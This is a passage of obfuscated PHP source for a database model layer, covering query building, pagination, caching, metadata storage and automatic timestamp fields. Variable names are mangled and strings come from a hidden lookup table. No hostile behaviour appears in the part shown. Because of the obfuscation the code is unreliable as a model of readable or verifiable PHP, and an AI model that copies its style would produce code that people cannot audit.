return $æø¼í˜õ; } public function db($¿õûïÑ÷ = '', $…ëÒ§†‰ = '', $Á¬úÕ¡… = array()) { $ÁëÎÖ«€ =& $_SERVER[¹Û¹Æ€]; if ($ÁëÎÖ«€[22] === $¿õûïÑ÷ && $this->db) { return $this->db; } static $ŸÚÚÒª­ = array(); static $íÚ×õˆ¿ = array(); if (!isset($íÚ×õˆ¿[$¿õûïÑ÷]) || isset($íÚ×õˆ¿[$¿õûïÑ÷]) && $…ëÒ§†‰ && $ŸÚÚÒª­[$¿õûïÑ÷] != $…ëÒ§†‰) { if (!empty($…ëÒ§†‰) && is_string($…ëÒ§†‰) && !1 === strpos($…ëÒ§†‰, $ÁëÎÖ«€[18])) { $…ëÒ§†‰ = think_config($…ëÒ§†‰); } $¿õûïÑ÷ = think_guid($…ëÒ§†‰); $íÚ×õˆ¿[$¿õûïÑ÷] = Db::getInstance($…ëÒ§†‰); } elseif (NULL === $…ëÒ§†‰) { $íÚ×õˆ¿[$¿õûïÑ÷]->close(); unset($íÚ×õˆ¿[$¿õûïÑ÷]); return; } if (!empty($Á¬úÕ¡…)) { if (is_string($Á¬úÕ¡…)) { parse_str($Á¬úÕ¡…, $Á¬úÕ¡…); } foreach ($Á¬úÕ¡… as $öèí–Á¶ => $Ÿ¨ê‰) { $this->setProperty($öèí–Á¶, $Ÿ¨ê‰); } } $ŸÚÚÒª­[$¿õûïÑ÷] = $…ëÒ§†‰; $this->db = $íÚ×õˆ¿[$¿õûïÑ÷]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $û‚Â°¤È = get_class($this); if ($û‚Â°¤È == $_SERVER[¹Û¹Æ€][355]) { return $this->name; } $this->name = substr($û‚Â°¤È, 0, -5); } return $this->name; } public function getTableName() { $Ë£‹Á’ =& $_SERVER[¹Û¹Æ€]; if (empty($this->trueTableName)) { $Ç³ÈÃï­ = !empty($this->tablePrefix) ? $this->tablePrefix : $Ë£‹Á’[22]; if (!empty($this->tableName)) { $Ç³ÈÃï­ .= $this->tableName; } else { $Ç³ÈÃï­ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Ç³ÈÃï­); } return (!empty($this->dbName) ? $this->dbName . $Ë£‹Á’[20] : $Ë£‹Á’[22]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $åËšÛ¡Ğ =& $_SERVER[¹Û¹Æ€]; return isset($this->fields[$åËšÛ¡Ğ[260]]) ? $this->fields[$åËšÛ¡Ğ[260]] : $this->pk; } public function getDbFields() { $âÙÇ‹‘ =& $_SERVER[¹Û¹Æ€]; if (isset($this->options[$âÙÇ‹‘[288]])) { $ÁÊÎÓÔ = $this->db->getFields($this->options[$âÙÇ‹‘[288]]); return $ÁÊÎÓÔ ? array_keys($ÁÊÎÓÔ) : !1; } if ($this->fields) { $ÁÊÎÓÔ = $this->fields; unset($ÁÊÎÓÔ[$âÙÇ‹‘[259]], $ÁÊÎÓÔ[$âÙÇ‹‘[260]], $ÁÊÎÓÔ[$âÙÇ‹‘[261]], $ÁÊÎÓÔ[$âÙÇ‹‘[258]]); return $ÁÊÎÓÔ; } return !1; } public function data($Á¡“•ˆ = '') { $ÌÇ´Ô”¸ =& $_SERVER[¹Û¹Æ€]; if ($ÌÇ´Ô”¸[22] === $Á¡“•ˆ && !empty($this->data)) { return $this->data; } if (is_object($Á¡“•ˆ)) { $Á¡“•ˆ = get_object_vars($Á¡“•ˆ); } elseif (is_string($Á¡“•ˆ)) { parse_str($Á¡“•ˆ, $Á¡“•ˆ); } elseif (!is_array($Á¡“•ˆ)) { think_exception(think_lang($ÌÇ´Ô”¸[280])); } $this->data = $Á¡“•ˆ; return $this; } public function join($ø‡ŠĞ·«) { $½ùó¼ü® =& $_SERVER[¹Û¹Æ€]; if (is_array($ø‡ŠĞ·«)) { $this->options[$½ùó¼ü®[291]] = $ø‡ŠĞ·«; } elseif (!empty($ø‡ŠĞ·«)) { $this->options[$½ùó¼ü®[291]][] = $ø‡ŠĞ·«; } return $this; } public function union($ÊÑ·ÖÖ¯, $ğ‚Ù‹ş¼ = false) { $Åë¥Ö½« =& $_SERVER[¹Û¹Æ€]; if (empty($ÊÑ·ÖÖ¯)) { return $this; } if ($ğ‚Ù‹ş¼) { $this->options[$Åë¥Ö½«[356]][$Åë¥Ö½«[357]] = !0; } if (is_object($ÊÑ·ÖÖ¯)) { $ÊÑ·ÖÖ¯ = get_object_vars($ÊÑ·ÖÖ¯); } if (is_string($ÊÑ·ÖÖ¯)) { $¬ñôıºÏ = $ÊÑ·ÖÖ¯; } elseif (is_array($ÊÑ·ÖÖ¯)) { if (isset($ÊÑ·ÖÖ¯[0])) { $this->options[$Åë¥Ö½«[356]] = array_merge($this->options[$Åë¥Ö½«[356]], $ÊÑ·ÖÖ¯); return $this; } else { $¬ñôıºÏ = $ÊÑ·ÖÖ¯; } } else { think_exception(think_lang($Åë¥Ö½«[280])); } $this->options[$Åë¥Ö½«[356]][] = $¬ñôıºÏ; return $this; } public function cache($ğ¬ß›³ô = true, $ô†”ı· = null, $ÀÂş¿÷Ï = '') { $ÕğîØÉŸ =& $_SERVER[¹Û¹Æ€]; if (!1 !== $ğ¬ß›³ô) { $this->options[$ÕğîØÉŸ[358]] = array($ÕğîØÉŸ[104] => $ğ¬ß›³ô, $ÕğîØÉŸ[348] => $ô†”ı·, $ÕğîØÉŸ[43] => $ÀÂş¿÷Ï); } return $this; } public function field($™­ªÙî˜, $º„•Š = false) { $ñùÓœš =& $_SERVER[¹Û¹Æ€]; if (!0 === $™­ªÙî˜) { $íåÖ™ä¶ = $this->getDbFields(); $™­ªÙî˜ = $íåÖ™ä¶ ? $íåÖ™ä¶ : $ñùÓœš[198]; } elseif ($º„•Š) { if (is_string($™­ªÙî˜)) { $™­ªÙî˜ = explode($ñùÓœš[60], $™­ªÙî˜); } $íåÖ™ä¶ = $this->getDbFields(); $™­ªÙî˜ = $íåÖ™ä¶ ? array_diff($íåÖ™ä¶, $™­ªÙî˜) : $™­ªÙî˜; } $this->options[$ñùÓœš[282]] = $™­ªÙî˜; return $this; } public function scope($¨è‚•§ = '', $‰Éˆù•Õ = NULL) { $†¤³ó” =& $_SERVER[¹Û¹Æ€]; if ($†¤³ó”[22] === $¨è‚•§) { if (isset($this->_scope[$†¤³ó”[47]])) { $ûƒ••Ê = $this->_scope[$†¤³ó”[47]]; } else { return $this; } } elseif (is_string($¨è‚•§)) { $„†¿Úó‰ = explode($†¤³ó”[60], $¨è‚•§); $ûƒ••Ê = array(); foreach ($„†¿Úó‰ as $ ˆø‡§ƒ) { if (!isset($this->_scope[$ ˆø‡§ƒ])) { continue; } $ûƒ••Ê = array_merge($ûƒ••Ê, $this->_scope[$ ˆø‡§ƒ]); } if (!empty($‰Éˆù•Õ) && is_array($‰Éˆù•Õ)) { $ûƒ••Ê = array_merge($ûƒ••Ê, $‰Éˆù•Õ); } } elseif (is_array($¨è‚•§)) { $ûƒ••Ê = $¨è‚•§; } if (is_array($ûƒ••Ê) && !empty($ûƒ••Ê)) { $this->options = array_merge($this->options, array_change_key_case($ûƒ••Ê)); } return $this; } public function where($ÆÇ¤£³¦, $İöşŞå© = null) { $‹ëö°ø =& $_SERVER[¹Û¹Æ€]; if (!is_null($İöşŞå©) && is_string($ÆÇ¤£³¦)) { if (!is_array($İöşŞå©)) { $İöşŞå© = func_get_args(); array_shift($İöşŞå©); } $İöşŞå© = array_map(array($this->db, $‹ëö°ø[352]), $İöşŞå©); $ÆÇ¤£³¦ = vsprintf($ÆÇ¤£³¦, $İöşŞå©); } elseif (is_object($ÆÇ¤£³¦)) { $ÆÇ¤£³¦ = get_object_vars($ÆÇ¤£³¦); } elseif (is_array($ÆÇ¤£³¦)) { foreach ($ÆÇ¤£³¦ as $¹‘àÕ† => $˜¡•×µ–) { if ((is_numeric($¹‘àÕ†) || !$¹‘àÕ†) && is_string($˜¡•×µ–)) { if (strpos($˜¡•×µ–, $‹ëö°ø[359]) === 0) { continue; } think_trace($‹ëö°ø[360], $‹ëö°ø[22], $‹ëö°ø[59]); die; } } } if (is_string($ÆÇ¤£³¦) && $‹ëö°ø[22] != $ÆÇ¤£³¦) { $­°“¯ò = array(); $­°“¯ò[$‹ëö°ø[361]] = $ÆÇ¤£³¦; $ÆÇ¤£³¦ = $­°“¯ò; } if (isset($this->options[$‹ëö°ø[284]])) { $this->options[$‹ëö°ø[284]] = array_merge($this->options[$‹ëö°ø[284]], $ÆÇ¤£³¦); } else { $this->options[$‹ëö°ø[284]] = $ÆÇ¤£³¦; } return $this; } public function limit($‘«¯¼áõ, $×ÍÓ’Ãß = null) { $ñ™Çª =& $_SERVER[¹Û¹Æ€]; $this->options[$ñ™Çª[301]] = is_null($×ÍÓ’Ãß) ? $‘«¯¼áõ : $‘«¯¼áõ . $ñ™Çª[60] . $×ÍÓ’Ãß; return $this; } public function page($…İŠğßÆ, $´Ì°ÛÇâ = null) { $³±óØá½ =& $_SERVER[¹Û¹Æ€]; $this->options[$³±óØá½[362]] = is_null($´Ì°ÛÇâ) ? $…İŠğßÆ : $…İŠğßÆ . $³±óØá½[60] . $´Ì°ÛÇâ; return $this; } public function comment($Á¡àÑÀë) { $this->options[$_SERVER[¹Û¹Æ€][363]] = $Á¡àÑÀë; return $this; } public function setProperty($Æ©¾Á¦ë, $±…ÊÚÖ) { if (property_exists($this, $Æ©¾Á¦ë)) { $this->{$Æ©¾Á¦ë} = $±…ÊÚÖ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\151\x66\x79\124\151\x6d\145", "\x74\x69\x6d\x65", "\151\x6e\163\x65\x72\164\x2c\x75\x70\144\141\x74\145", "\x66\165\156\x63\164\151\x6f\x6e"), array("\x63\162\145\141\164\x65\124\151\x6d\145", "\164\x69\155\145", "\x69\156\163\145\162\x74", "\x66\165\x6e\143\x74\151\157\x6e")); public function setDataAuto($øÅ½ÂÑÉ) { $this->dataAuto = $øÅ½ÂÑÉ; } public function __construct($ÊªÖÉ£ = '', $¢âËëšû = '', $Óş Û¢ò = '') { parent::__construct($ÊªÖÉ£, $¢âËëšû, $Óş Û¢ò); } protected $tableMeta = array(); protected function _beforeInsert(&$¦œ±ò­, $ïïÉ”ñæ) { $³§Äò¥• =& $_SERVER[¹Û¹Æ€]; if (!$this->checkDataAutoHas($³§Äò¥•[364])) { return; } $this->dataBeforeFilter($¦œ±ò­, $³§Äò¥•[364]); } protected function _beforeUpdate(&$ò‡á¤©Ë, $Äõ¹ÓüÛ) { $Š„ÀÍÑÀ =& $_SERVER[¹Û¹Æ€]; if (!$this->checkDataAutoHas($Š„ÀÍÑÀ[365])) { return; } $this->dataBeforeFilter($ò‡á¤©Ë, $Š„ÀÍÑÀ[365]); } protected function _afterSelect(&$Ëê¶‰Ù‰, $Û‹ŒÙäç) { if (!is_array($Ëê¶‰Ù‰)) { return; } if (!$this->checkDataAutoHas($_SERVER[¹Û¹Æ€][366])) { return; } foreach ($Ëê¶‰Ù‰ as &$·àÀÃ¤¨) { $this->dataAfterFilter($·àÀÃ¤¨); } unset($·àÀÃ¤¨); } protected function _afterFind(&$«æ÷ò±–, $ˆ¢ØÁğº) { if (!is_array($«æ÷ò±–)) { return; } if (!$this->checkDataAutoHas($_SERVER[¹Û¹Æ€][366])) { return; } $this->dataAfterFilter($«æ÷ò±–); } public static function textEncode($÷á«”Œş) { if (!$÷á«”Œş) { return $÷á«”Œş; } $û«Š±”Ã = json_encode($÷á«”Œş); $û«Š±”Ã = preg_replace_callback($_SERVER[¹Û¹Æ€][367], function ($¡ñÜËÖ) { return addslashes($¡ñÜËÖ[0]); }, $û«Š±”Ã); return json_decode($û«Š±”Ã); } public static function textDecode($ÎÄêñÃı) { $®¬ˆÆ´Ÿ =& $_SERVER[¹Û¹Æ€]; $Ûé°É²Ä = json_encode($ÎÄêñÃı); $Ûé°É²Ä = preg_replace_callback($®¬ˆÆ´Ÿ[368], function ($òõÁğìì) { return $_SERVER[¹Û¹Æ€][107]; }, $Ûé°É²Ä); return json_decode($Ûé°É²Ä); } public function setAutoIncrement($Ó „¸±) { $ıºõâ‘ = array($this->getPk() => $Ó „¸±); $Ëş”‡ØÉ = $this->data($ıºõâ‘)->add(); if ($Ëş”‡ØÉ) { $this->delete($Ëş”‡ØÉ); } } public function getAutoIncrement() { $ÛŠéõ½ = $this->getTableName(); $ï¼ûîê = $this->max($this->getPk()); $şòŞéêõ = $this->query("\163\150\157\167\x20\x74\141\x62\154\x65\x20\163\x74\141\x74\165\x73\40\167\150\145\x72\145\40\116\x61\155\145\x3d\47{$ÛŠéõ½}\x27"); $é„û¾© = $şòŞéêõ[0][$_SERVER[¹Û¹Æ€][369]]; $Œ©ğªù‹ = max($ï¼ûîê, $é„û¾©); return $Œ©ğªù‹; } protected function _callBefore($˜—€€‘ú, $²ÖùÔâÃ) { return $this->cacheCallCheck($˜—€€‘ú, $²ÖùÔâÃ, !1); } protected function _callAfter($û’ŒöÂ, $ê¹Úõ³½) { return $this->cacheCallCheck($û’ŒöÂ, $ê¹Úõ³½, !0); } protected function cacheFunctionAlias($‚ÆÓŞìÂ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ĞÑÁ°Ä, $¢‰™¹ªØ, $ÉèÔæé« = false) { $²™áÚß¬ = $this->cacheFunctionAlias($¢‰™¹ªØ); if (!$²™áÚß¬) { return; } foreach ($²™áÚß¬ as $ë®–ä… => $âäõšì“) { $­Õğ’—á = $âäõšì“[0]; $‰ ¿ëÄƒ = explode($_SERVER[¹Û¹Æ€][60], $âäõšì“[1]); if ($ĞÑÁ°Ä == $ë®–ä…) { return $this->cacheFunctionGet($ë®–ä…, $­Õğ’—á); } if ($ÉèÔæé« && in_array($ĞÑÁ°Ä, $‰ ¿ëÄƒ)) { $this->cacheFunctionClear($ë®–ä…, $­Õğ’—á); } } } public function cacheFunctionGet($ƒÑûı¾Í, $Á·¦¢—Ò) { $ˆÔ¦ö = $this->cacheKeyMake($ƒÑûı¾Í, $Á·¦¢—Ò); $ÛµÙ‰å© = Cache::get($ˆÔ¦ö); if (!is_array($ÛµÙ‰å©)) { $ÛµÙ‰å© = call_user_func_array(array($this, $ƒÑûı¾Í), array($Á·¦¢—Ò, !0)); Cache::set($ˆÔ¦ö, $ÛµÙ‰å©); } return $ÛµÙ‰å©; } public function cacheFunctionClear($ ªÁµ´Ú, $äËú–¤) { $ÜÚŠÑ× = $äËú–¤; if (!is_array($äËú–¤)) { $ÜÚŠÑ× = array($äËú–¤); } foreach ($ÜÚŠÑ× as $ñ¬•Í) { $‰İ­Àó = $this->cacheKeyMake($ ªÁµ´Ú, $ñ¬•Í); Cache::remove($‰İ­Àó); } } private function cacheKeyMake($×ÚÌ¼üï, $Ğîí¦ƒ) { $ÁºÆŸŞ— =& $_SERVER[¹Û¹Æ€]; return get_class($this) . $ÁºÆŸŞ—[21] . $×ÚÌ¼üï . $ÁºÆŸŞ—[370] . $Ğîí¦ƒ; } protected function selectPageReset() { $ùªµü°ş =& $_SERVER[¹Û¹Æ€]; if (isset($GLOBALS[$ùªµü°ş[371]])) { return; } $GLOBALS[$ùªµü°ş[371]] = isset($GLOBALS[$ùªµü°ş[17]][$ùªµü°ş[372]]) ? $GLOBALS[$ùªµü°ş[17]][$ùªµü°ş[372]] : !1; $GLOBALS[$ùªµü°ş[373]] = isset($GLOBALS[$ùªµü°ş[17]][$ùªµü°ş[362]]) ? $GLOBALS[$ùªµü°ş[17]][$ùªµü°ş[362]] : !1; $GLOBALS[$ùªµü°ş[17]][$ùªµü°ş[372]] = !1; $GLOBALS[$ùªµü°ş[17]][$ùªµü°ş[362]] = !1; } protected function selectPageRestore() { $Å•òèÏ€ =& $_SERVER[¹Û¹Æ€]; if (!isset($GLOBALS[$Å•òèÏ€[371]])) { return; } $GLOBALS[$Å•òèÏ€[17]][$Å•òèÏ€[372]] = $GLOBALS[$Å•òèÏ€[371]]; $GLOBALS[$Å•òèÏ€[17]][$Å•òèÏ€[362]] = $GLOBALS[$Å•òèÏ€[373]]; if ($GLOBALS[$Å•òèÏ€[17]][$Å•òèÏ€[372]] === !1) { unset($GLOBALS[$Å•òèÏ€[17]][$Å•òèÏ€[372]]); } if ($GLOBALS[$Å•òèÏ€[17]][$Å•òèÏ€[362]] === !1) { unset($GLOBALS[$Å•òèÏ€[17]][$Å•òèÏ€[362]]); } unset($GLOBALS[$Å•òèÏ€[371]]); unset($GLOBALS[$Å•òèÏ€[373]]); } protected function selectPage($£Ô´şæ = 200, $Ò²¨Â® = 1) { $‘ÄÇÔ° =& $_SERVER[¹Û¹Æ€]; global $in; $ãÇÄÌÌü = $this->optionsValue(); $Ö÷Ê‰†è = 50000; $£Ô´şæ = isset($in[$‘ÄÇÔ°[372]]) && $in[$‘ÄÇÔ°[372]] ? $in[$‘ÄÇÔ°[372]] : $£Ô´şæ; if ($£Ô´şæ === -1) { $in[$‘ÄÇÔ°[372]] = !1; $Ö÷Ê‰†è = 100000000; $£Ô´şæ = $Ö÷Ê‰†è; } $ƒÌ¨ƒß = $ãÇÄÌÌü; $ƒÌ¨ƒß[$‘ÄÇÔ°[374]] = array(); $£Ô´şæ = intval($£Ô´şæ); $£Ô´şæ = $£Ô´şæ <= 5 ? 5 : ($£Ô´şæ >= $Ö÷Ê‰†è ? $Ö÷Ê‰†è : $£Ô´şæ); $Ò²¨Â® = intval(isset($in[$‘ÄÇÔ°[362]]) && $in[$‘ÄÇÔ°[362]] ? $in[$‘ÄÇÔ°[362]] : $Ò²¨Â®); $Ò²¨Â® = $Ò²¨Â® <= 1 ? 1 : $Ò²¨Â®; $« ‡äˆš = array(); $›±ÏÎ¯¸ = 1; if ($Ò²¨Â® == 1 && $›±ÏÎ¯¸) { $this->optionsValue($ãÇÄÌÌü); $« ‡äˆš = $this->page($Ò²¨Â®, $£Ô´şæ)->select(); $— Ì‹‚Å = is_array($« ‡äˆš) ? count($« ‡äˆš) : 0; if ($— Ì‹‚Å < $£Ô´şæ) { $«·óßŸ° = 1; } else { $this->optionsValue($ƒÌ¨ƒß); $— Ì‹‚Å = intval($this->count()); $«·óßŸ° = ceil($— Ì‹‚Å / $£Ô´şæ); } } else { $this->optionsValue($ƒÌ¨ƒß); $— Ì‹‚Å = intval($this->count()); $«·óßŸ° = ceil($— Ì‹‚Å / $£Ô´şæ); $Ò²¨Â® = $Ò²¨Â® >= $«·óßŸ° ? $«·óßŸ° : $Ò²¨Â®; $this->optionsValue($ãÇÄÌÌü); $« ‡äˆš = $this->page($Ò²¨Â®, $£Ô´şæ)->select(); } if (!is_array($« ‡äˆš)) { $« ‡äˆš = array(); } if ($«·óßŸ° == 1) { $— Ì‹‚Å = count($« ‡äˆš); } $ùĞãù¶ = array($‘ÄÇÔ°[375] => array($‘ÄÇÔ°[376] => $— Ì‹‚Å, $‘ÄÇÔ°[372] => $£Ô´şæ, $‘ÄÇÔ°[362] => $Ò²¨Â®, $‘ÄÇÔ°[377] => $«·óßŸ°), $‘ÄÇÔ°[378] => $« ‡äˆš); return $ùĞãù¶; } protected function checkLength($û‘Ôİ÷, $–÷û¡¥¦ = 0, $ƒ›‰Ÿˆş = '') { $ù©ê¿ =& $_SERVER[¹Û¹Æ€]; $–÷û¡¥¦ = $–÷û¡¥¦ ? $–÷û¡¥¦ : 65536; if (!$û‘Ôİ÷ || strlen($û‘Ôİ÷) < $–÷û¡¥¦) { return; } $ƒ›‰Ÿˆş = $ƒ›‰Ÿˆş ? $ƒ›‰Ÿˆş . $ù©ê¿[81] : $ù©ê¿[22]; show_json($ƒ›‰Ÿˆş . LNG($ù©ê¿[379]) . "\x28{$–÷û¡¥¦}\51", !1); } protected function metaSet($°é£•¯ã, $Ñ°ÌÀÄ¢ = null, $íãÚÄ„ = null) { $î¤ı„ƒÖ =& $_SERVER[¹Û¹Æ€]; if (!$this->tableMeta || !$°é£•¯ã) { return !1; } $âÄöÜ¢Ì = $this->tableMeta[$î¤ı„ƒÖ[380]]; $ó‘¡ïúŞ = $this->tableMeta[$î¤ı„ƒÖ[381]]; $Ó À¯ïœ = Model($ó‘¡ïúŞ); $ìóÅé§˜ = array($âÄöÜ¢Ì => $°é£•¯ã, $î¤ı„ƒÖ[382] => $Ñ°ÌÀÄ¢); if (is_null($Ñ°ÌÀÄ¢)) { return $Ó À¯ïœ->where(array($âÄöÜ¢Ì => $°é£•¯ã))->delete(); } if (is_null($íãÚÄ„) && is_string($Ñ°ÌÀÄ¢)) { return $Ó À¯ïœ->where($ìóÅé§˜)->delete(); } $Ôƒ²Ú ­ = is_array($Ñ°ÌÀÄ¢) ? $Ñ°ÌÀÄ¢ : array(); if (is_string($Ñ°ÌÀÄ¢)) { $Ôƒ²Ú ­[$Ñ°ÌÀÄ¢] = $íãÚÄ„; } $ŞñÏ€àÄ = array(); foreach ($Ôƒ²Ú ­ as $ºÎ ùå => $Ä§•ä§) { if (is_null($Ä§•ä§) && is_string($ºÎ ùå)) { $Ó À¯ïœ->where(array($âÄöÜ¢Ì => $°é£•¯ã, $î¤ı„ƒÖ[382] => $ºÎ ùå))->delete(); continue; } $this->checkLength($Ä§•ä§, !1, $ó‘¡ïúŞ . $î¤ı„ƒÖ[4] . $ºÎ ùå); $ŞñÏ€àÄ[] = array($âÄöÜ¢Ì => $°é£•¯ã, $î¤ı„ƒÖ[104] => $ºÎ ùå, $î¤ı„ƒÖ[383] => $Ä§•ä§); } $ê¸­ò… = $î¤ı„ƒÖ[384] . $ó‘¡ïúŞ; CacheLock::lock($ê¸­ò…); $Ó À¯ïœ->where(array($âÄöÜ¢Ì => $°é£•¯ã))->addAll($ŞñÏ€àÄ, array(), !0); CacheLock::unlock($ê¸­ò…); return !0; } public function metaGet($°£Ğü‘°, $Ö’…á¨÷ = false) { $¯ô·©ÈÀ =& $_SERVER[¹Û¹Æ€]; if (!$this->tableMeta) { return array(); } $ªüØÓºĞ = $this->tableMeta[$¯ô·©ÈÀ[380]]; $È£ïş°Ç = Model($this->tableMeta[$¯ô·©ÈÀ[381]]); if ($Ö’…á¨÷) { $•ªîšøè = array($ªüØÓºĞ => $°£Ğü‘°, $¯ô·©ÈÀ[104] => $Ö’…á¨÷); return $È£ïş°Ç->where($•ªîšøè)->getField($¯ô·©ÈÀ[383]); } $•ªîšøè = array($ªüØÓºĞ => $°£Ğü‘°); $Ğè–’äÚ = $È£ïş°Ç->field($¯ô·©ÈÀ[385])->where($•ªîšøè)->select(); $Ğè–’äÚ = array_to_keyvalue($Ğè–’äÚ, $¯ô·©ÈÀ[104], $¯ô·©ÈÀ[383]); return $Ğè–’äÚ; } private function checkDataAutoHas($§œ‰ó¹Æ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ËùÆÊ‹) { if (in_array($§œ‰ó¹Æ, explode($_SERVER[¹Û¹Æ€][60], $ËùÆÊ‹[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Õè­”Ì¬, $ÎĞœ»Äì) { $äÎ¯ÎÚ´ =& $_SERVER[¹Û¹Æ€]; if (!is_array($Õè­”Ì¬)) { return; } foreach ($this->dataAuto as $¹ÕÛ£îæ) { $Á›ª˜” = $¹ÕÛ£îæ[0]; if (!in_array($ÎĞœ»Äì, explode($äÎ¯ÎÚ´[60], $¹ÕÛ£îæ[2]))) { continue; } switch (trim($¹ÕÛ£îæ[3])) { case $äÎ¯ÎÚ´[330]: case $äÎ¯ÎÚ´[331]: $§Ó¤éìŞ = $¹ÕÛ£îæ[1]; $‰Âø¦Øò = isset($¹ÕÛ£îæ[4]) ? (array) $¹ÕÛ£îæ[4] : array(); if ($§Ó¤éìŞ == $äÎ¯ÎÚ´[213] && array_key_exists($Á›ª˜”, $Õè­”Ì¬)) { if (!$Õè­”Ì¬[$Á›ª˜”]) { unset($Õè­”Ì¬[$Á›ª˜”]); } break; } if (isset($Õè­”Ì¬[$Á›ª˜”])) { array_unshift($‰Âø¦Øò, $Õè­”Ì¬[$Á›ª˜”]); } if ($äÎ¯ÎÚ´[330] == $¹ÕÛ£îæ[3]) { $Õè­”Ì¬[$Á›ª˜”] = call_user_func_array($§Ó¤éìŞ, $‰Âø¦Øò); } else { $Õè­”Ì¬[$Á›ª˜”] = call_user_func_array(array(&$this, $§Ó¤éìŞ), $‰Âø¦Øò); } break; case $äÎ¯ÎÚ´[279]: if (isset($Õè­”Ì¬[$Á›ª˜”]) && $Õè­”Ì¬[$Á›ª˜”]) { $Õè­”Ì¬[$Á›ª˜”] = call_user_func_array(array(&$this, $¹ÕÛ£îæ[1]), array($Õè­”Ì¬[$Á›ª˜”])); } break; case $äÎ¯ÎÚ´[282]: $Õè­”Ì¬[$Á›ª˜”] = $Õè­”Ì¬[$¹ÕÛ£îæ[1]]; break; case $äÎ¯ÎÚ´[303]: if (isset($Õè­”Ì¬[$Á›ª˜”]) && !is_string($Õè­”Ì¬[$Á›ª˜”])) { $Õè­”Ì¬[$Á›ª˜”] = json_encode_force($Õè­”Ì¬[$Á›ª˜”]); } break; case $äÎ¯ÎÚ´[332]: if ($Õè­”Ì¬[$Á›ª˜”] === $äÎ¯ÎÚ´[22]) { unset($Õè­”Ì¬[$Á›ª˜”]); } break; case $äÎ¯ÎÚ´[333]: $Õè­”Ì¬[$Á›ª˜”] = $¹ÕÛ£îæ[1]; default: break; } } if ($ÎĞœ»Äì == $äÎ¯ÎÚ´[364]) { $Á´Ú¢Ã÷ = strtolower($this->db->getDbType()); if (strpos($Á´Ú¢Ã÷, $äÎ¯ÎÚ´[23]) !== 0) { return; } $îúô©¬È = $this->field(!0)->fields; $•ÍÔ€ = $îúô©¬È[$äÎ¯ÎÚ´[261]]; if (isset($îúô©¬È[$äÎ¯ÎÚ´[260]])) { unset($•ÍÔ€[$îúô©¬È[$äÎ¯ÎÚ´[260]]]); } foreach ($•ÍÔ€ as $¦ó»¤¦Ä => $ÎĞœ»Äì) { if (!isset($Õè­”Ì¬[$¦ó»¤¦Ä])) { $Õè­”Ì¬[$¦ó»¤¦Ä] = $äÎ¯ÎÚ´[22]; } } } } private function dataAfterFilter(&$“Êàœñ³) { $ş¢˜Õ¾“ =& $_SERVER[¹Û¹Æ€]; foreach ($this->dataAuto as $ÎÆÒ©†‡) { $âí¨İ¿Ê = $ÎÆÒ©†‡[0]; if (!isset($“Êàœñ³[$âí¨İ¿Ê])) { continue; } if (!in_array($ş¢˜Õ¾“[366], explode($ş¢˜Õ¾“[60], $ÎÆÒ©†‡[2]))) { continue; } switch (trim($ÎÆÒ©†‡[3])) { case $ş¢˜Õ¾“[330]: case $ş¢˜Õ¾“[331]: $”îûØÀï = isset($ÎÆÒ©†‡[4]) ? (array) $ÎÆÒ©†‡[4] : array(); array_unshift($”îûØÀï, $“Êàœñ³[$âí¨İ¿Ê]); if (isset($ÎÆÒ©†‡[4]) && $ÎÆÒ©†‡[4] == $ş¢˜Õ¾“[386]) { $”îûØÀï = array($“Êàœñ³[$âí¨İ¿Ê]); } if ($ş¢˜Õ¾“[330] == $ÎÆÒ©†‡[3]) { $“Êàœñ³[$âí¨İ¿Ê] = call_user_func_array($ÎÆÒ©†‡[1], $”îûØÀï); } else { $“Êàœñ³[$âí¨İ¿Ê] = call_user_func_array(array(&$this, $ÎÆÒ©†‡[1]), $”îûØÀï); } break; case $ş¢˜Õ¾“[279]: if (isset($“Êàœñ³[$âí¨İ¿Ê]) && $“Êàœñ³[$âí¨İ¿Ê]) { $“Êàœñ³[$âí¨İ¿Ê] = call_user_func_array(array(&$this, $ÎÆÒ©†‡[1]), array($“Êàœñ³[$âí¨İ¿Ê])); } break; case $ş¢˜Õ¾“[282]: $“Êàœñ³[$âí¨İ¿Ê] = $“Êàœñ³[$ÎÆÒ©†‡[1]]; break; case $ş¢˜Õ¾“[303]: $ßòºè¢Õ = $“Êàœñ³[$âí¨İ¿Ê]; $“Êàœñ³[$âí¨İ¿Ê] = json_decode($ßòºè¢Õ, !0); if (is_null($“Êàœñ³[$âí¨İ¿Ê])) { $“Êàœñ³[$âí¨İ¿Ê] = $ßòºè¢Õ; } break; case $ş¢˜Õ¾“[332]: if ($“Êàœñ³[$âí¨İ¿Ê] === $ş¢˜Õ¾“[22]) { unset($“Êàœñ³[$âí¨İ¿Ê]); } break; case $ş¢˜Õ¾“[333]: $“Êàœñ³[$âí¨İ¿Ê] = $ÎÆÒ©†‡[1]; break; default: break; } } } public function saveAll($–½‘ÖúÑ) { $ÕÚÓø¥Ú =& $_SERVER[¹Û¹Æ€]; $¬¬ù¨‰¢ = $this->tablePrefix . $this->tableName; $¹šï¶½— = self::SQL_WHERE_IN_CHUNK; $–½‘ÖúÑ = is_array($–½‘ÖúÑ) ? $–½‘ÖúÑ : array(); $ª¾øİäÕ = $ÕÚÓø¥Ú[387]; $áú¼ê×Á = 0; $®µ³®ä´ = array(); $À¶ÍÄ‰ = count($–½‘ÖúÑ); for ($ÃÕ¶¤Ä¯ = 0; $ÃÕ¶¤Ä¯ < $À¶ÍÄ‰; $ÃÕ¶¤Ä¯++) { $½‰äÜŠÕ = $–½‘ÖúÑ[$ÃÕ¶¤Ä¯]; if (!is_array($½‰äÜŠÕ) || count($½‰äÜŠÕ) != 4) { continue; } $ ³ÅÛ­› = 